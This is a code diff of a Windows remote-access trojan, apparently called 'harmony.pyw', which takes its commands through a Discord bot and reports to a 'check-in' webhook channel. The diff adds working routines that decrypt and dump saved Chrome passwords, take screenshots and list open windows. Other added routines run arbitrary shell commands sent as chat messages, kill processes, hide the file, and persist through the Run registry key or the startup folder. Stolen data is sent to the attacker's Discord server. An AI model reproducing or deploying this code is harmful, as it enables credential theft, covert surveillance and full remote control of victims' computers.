@@ -1,68 +1,66 @@
 import discord
 import os
-import subprocess
 import asyncio
 import requests
 import urllib
 import json
 import ctypes
 import sys
-import win32gui
-import winreg as reg
 import atexit
+import re
+import base64
+import sqlite3
+import shutil
+import win32crypt
+import subprocess
+import winreg as reg
+from PIL import Image
 from discord.ext import commands
-
-import windows_manipulator as wm
-import cred_stealer as cs
+from Cryptodome.Cipher import AES
+import win32api, win32con, win32gui, win32ui
 
 intents = discord.Intents.all()
 intents.message_content = True
 
+#------------------------------------------------------------------#
+#In your server you MUST create a text channel named 'check-in' and
+#create a webhook that posts in the 'check-in' channel
+#Supply that Webhook URL to the whURL variable
+#------------------------------------------------------------------#
+
 #Enter your Discord servers webhook URL, bot token, and server id, filename of the executable
 whURL = ''
-TOKEN = ""
+TOKEN = ''
 serverID =  #Takes an integer
 filename = 'harmony.pyw'
 
 webhook = discord.SyncWebhook.from_url(whURL)
 client = discord.Client(intents=intents)
 
-guild = ''
 hwid = ''
 
+CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
+CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
 
 @client.event
 async def on_ready():
     global guild
     guild = client.get_guild(serverID)
     first_run = True
-    first_client = True
     global hwid
     hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
    
     for category_name in guild.categories:
-        if str(category_name) == "Control":
-            first_client = False
-            
         if hwid == str(category_name):
 
             first_run = False
             break
-   
-    if first_client:
-        c = await guild.create_category('Control')
-        
-        await guild.create_text_channel('chat', category=c)
-        await guild.create_text_channel('check-in', category=c)
         
     for channel in guild.channels:
         if str(channel) == 'check-in':
-            first_client = False
             await channel.send("{} has connected.".format(hwid))
             break
-    
 
-            
     if first_run:
         category = await guild.create_category(hwid)
         await guild.create_text_channel('main', category=category)
@@ -72,7 +70,7 @@ async def on_ready():
         for channel in category.channels:
             if channel.name == 'creds':
                 
-                creds = cs.cred_stealer()
+                creds = cred_stealer()
                 await channel.send(creds)
                 
             if channel.name == 'info':
@@ -81,7 +79,7 @@ async def on_ready():
                 
                 is_persistant = addPersistence()
                     
-                is_admin = wm.isAdmin()                
+                is_admin = isAdmin()                
                 computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
                 cpu = subprocess.run(["wmic", "cpu", "get", "Name"],capture_output=True, text=True).stdout.strip().split('\n')[2]
                 gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True,shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
@@ -128,16 +126,19 @@ async def on_message(msg):
             
         if str_msg[0] == ">":
             str_msg = str_msg[1:]
+            
             if str_msg[0] == " ":
                 str_msg = str_msg[1:]
-                
-            for line in run_command(str_msg):
+
+            for line in runCommand(str_msg):
                 response += line
+                
                 if len(response) > 2000:
                     t = response[2000:]
                     response = response[:2000]
                     
                     await msg.channel.send(response.decode())
+                    
                     if t:
                         await msg.channel.send(t.decode())
                     
@@ -158,37 +159,53 @@ async def on_message(msg):
             await msg.channel.send(p)
         
         elif str_msg == "hide":
-            hideFile()
+            p = hideFile()
+            
+            if p is None:
+                p = "Successfully hid file"
+                
+            await msg.channel.send(p)
 
         elif str_msg == "unhide":
-            unhideFile()
-        
+            p = unhideFile()
+            
+            if p is None:
+                p = "Successfully unhid file"
+                
+            await msg.channel.send(p)
+                
         elif command == "download" or command == "dl":
             try:
                 await msg.channel.send(file=discord.File(args))
-            except (FileNotFoundError, PermissionError) as e:
+                
+            except Exception as e:
                 await msg.channel.send(e)
                 
         elif str_msg == "upload" or str_msg == "ul":
             await upload(msg)
             
         elif str_msg == "ss" or str_msg == "screenshot":
-            await screenShot()
-                        
-        elif str_msg == "fss" or str_msg == "focusScreenshot":
-            await focusScreenShot()
+            s = getScreenshot()
+            
+            if s:
+                await msg.channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.jpg"))
                 
-        elif str_msg == "listWindows" or str_msg == "lw":
-            p = listWindows()
+                os.remove("C:\\Users\\Public\\Downloads\\Update.jpg")
+                
+            else:
+                await msg.channel.send("Failed to take screenshot.")
+                
+        elif str_msg == "listwindows" or str_msg == "lw":
+            p = printWindows()
             
             await msg.channel.send(p)
         
-        elif str_msg == "credDump" or str_msg == "cred":
-            dump = cs.cred_stealer()
+        elif str_msg == "creddump" or str_msg == "cred":
+            dump = cred_stealer()
             
             await msg.channel.send(dump)
             
-        elif str_msg == "persistance" or str_msg == "pt":            
+        elif str_msg == "persistence" or str_msg == "pt":            
             p = addPersistence()
             result = "Failed to add persistence."
             
@@ -198,18 +215,36 @@ async def on_message(msg):
             await msg.channel.send(result)
 
 def killProc(pid):
-    p = subprocess.run(["taskkill","/F","/PID",pid],stdout=subprocess.PIPE,stderr=subprocess.PIPE,check=True)
-    
+    try:
+        p = subprocess.run(["taskkill","/F","/PID",pid],stdout=subprocess.PIPE,stderr=subprocess.PIPE,check=True)
+    except Exception as p:
+        pass
+        
     return p
     
 def hideFile():
-    subprocess.run(["attrib","+H",filename],check=True)
-    
+    p = None
+    try:
+        subprocess.run(["attrib","+H",filename],check=True)
+        
+    except Exception as p:
+        pass
+        
+    return p
+        
 def unhideFile():
-    subprocess.run(["attrib","-H",filename],check=True)
-    
+    p = None
+    try:
+        subprocess.run(["attrib","-H",filename],check=True)
+        
+    except Exception as p:
+        pass
+        
+    return p
+        
 def addPersistence():
-    s = addToRegistry(filename)
+    s = addToRegistry()
+    
     if not s:
         s = addToStartup()
         
@@ -227,30 +262,11 @@ async def upload(msg):
         except IndexError:
             await msg.channel.send("Failed to upload...")
 
-async def screenShot():
-    s = wm.getScreenshot("C:\\Users\\Public\\Downloads\\Update.png")
-    if s:
-        await msg.channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.png"))
-        
-        os.remove("C:\\Users\\Public\\Downloads\\Update.png")
-
-async def focusScreenShot():
-    window_list = wm.printWindows()
-    for window in window_list:
-        hwnd = wm.getHwnd(window)
-        s = wm.getFocusScreenshot(hwnd, "C:\\Users\\Public\\Downloads\\Update.png")
-        if s:
-            await msg.channel.send(window)
-            await msg.channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.png"))
-        
-            os.remove("C:\\Users\\Public\\Downloads\\Update.png")
-
-def listWindows():
-    window_list = wm.printWindows()
+def printWindows():
+    window_list = listWindows()
     str_w_l = 'Active Windows:\n\n'
+    
     for window in window_list:
-        if window == '':
-            continue
         str_w_l += "Window: " + window + "\n"
         
     return str_w_l
@@ -270,8 +286,7 @@ def addToStartup():
     except:
         return False
 
-#Must provide and EXE for registery to work
-def addToRegistry(filename):
+def addToRegistry():
     try:
         pth = os.path.dirname(os.path.realpath(__file__)) 
          
@@ -282,22 +297,174 @@ def addToRegistry(filename):
          
         open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
          
-        reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
+        reg.SetValueEx(open,"test",0,reg.REG_SZ,address)
          
         reg.CloseKey(open)
+        
         return True
         
     except:
         return False
     
-def run_command(command):
-    p = subprocess.Popen(command, shell = True,
-                         stdout=subprocess.PIPE,
-                         stderr=subprocess.STDOUT)
-    
-    return iter(p.stdout.readline, b'')    
-
+def runCommand(command):
+    try:
+        p = subprocess.Popen(command, shell = True,
+                             stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT)
         
+        return iter(p.stdout.readline, b'')    
+    except Exception as p:
+        return p
+        
+#Gets all open windows
+def winEnumHandler(window_name, w_list):
+    if win32gui.IsWindowVisible(window_name):
+        str_w = win32gui.GetWindowText(window_name)
+        
+        if str_w != '' and str_w != ' ' and str_w != 'Settings':    
+            w_list.append("{}".format(str_w))
+
+#Returns a list of open windows
+def listWindows():  
+    win_list = []    
+    win32gui.EnumWindows(winEnumHandler, win_list)
+    
+    return win_list
+        
+#Get screenshot of current window
+def getScreenshot(path=None):
+    try:
+        x = 0
+        y = 0
+        
+        x2 = win32api.GetSystemMetrics(0)
+        y2 = win32api.GetSystemMetrics(1)
+        
+        W = x2 - x
+        H = y2 - y
+        
+        #get image data
+        wDC = win32gui.GetWindowDC(None)
+        dcObj = win32ui.CreateDCFromHandle(wDC)
+        cDC = dcObj.CreateCompatibleDC()
+        dataBitMap = win32ui.CreateBitmap()
+        dataBitMap.CreateCompatibleBitmap(dcObj, W, H)
+        cDC.SelectObject(dataBitMap)
+        cDC.BitBlt((0, 0), (W, H), dcObj, (0, 0), win32con.SRCCOPY)
+
+        if path == None:
+            dataBitMap.SaveBitmapFile(cDC, 'C:\\Users\\Public\\Downloads\\Update.jpg')
+            img = Image.open('C:\\Users\\Public\\Downloads\\Update.jpg')
+            img.save('C:\\Users\\Public\\Downloads\\Update.jpg', optimize=True)
+        else:
+            dataBitMap.SaveBitmapFile(cDC, path)
+
+        #Free Resources
+        dcObj.DeleteDC()
+        cDC.DeleteDC()
+        win32gui.ReleaseDC(None, wDC)
+        win32gui.DeleteObject(dataBitMap.GetHandle())
+
+        return True
+        
+    except:
+        return False
+
+def isAdmin():
+    user = ''
+    admins = ''
+    platform = 'powershell.exe '
+    admin_cmd = 'net localgroup administrators'
+    admin_cmd = admin_cmd.split()
+    
+    for line in runCommand('whoami'):
+        user += line.decode()
+    for line in runCommand(admin_cmd):
+        admins += line.decode()
+        
+    if '\\' in user:
+        user = user.split('\\')[1]
+
+    if 'Administrator' in admins:
+        admins = admins.split('Administrator')[2]
+
+    if user in admins:
+        return True
+        
+    else:
+        return False
+
+#Credits to LimerBoy for cred_stealer
+def get_secret_key():
+    try:
+        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        secret_key = secret_key[5:] 
+        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+        return secret_key
+    except Exception as e:
+
+        return None
+    
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+def decrypt_password(ciphertext, secret_key):
+    try:
+        initialisation_vector = ciphertext[3:15]
+        encrypted_password = ciphertext[15:-16]
+        cipher = generate_cipher(secret_key, initialisation_vector)
+        decrypted_pass = decrypt_payload(cipher, encrypted_password)
+        decrypted_pass = decrypted_pass.decode()  
+        return decrypted_pass
+    except Exception as e:
+        return ""
+    
+def get_db_connection(chrome_path_login_db):
+    try:
+        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
+        return sqlite3.connect("Loginvault.db")
+    except Exception as e:
+        return None
+       
+def cred_stealer():
+    response = ''
+    try:
+        secret_key = get_secret_key()
+        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
+        
+        for folder in folders:
+            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
+            conn = get_db_connection(chrome_path_login_db)
+            
+            if(secret_key and conn):
+                cursor = conn.cursor()
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                
+                for index,login in enumerate(cursor.fetchall()):
+                    url = login[0]
+                    username = login[1]
+                    ciphertext = login[2]
+                    
+                    if(url!="" and username!="" and ciphertext!=""):
+                        decrypted_password = decrypt_password(ciphertext, secret_key)
+                        response += "Sequence: %d\n"%(index)
+                        response += "URL: %s\nUser Name: %s\nPassword: %s\n\n"%(url,username,decrypted_password)
+                        response += "*"*50
+                        response += "\n"
+                cursor.close()
+                conn.close()
+                os.remove("Loginvault.db")
+    except Exception as e:
+        pass
+        
+    return response
+
 def exit_handler():
     message = hwid + " Has Disconnected."
     
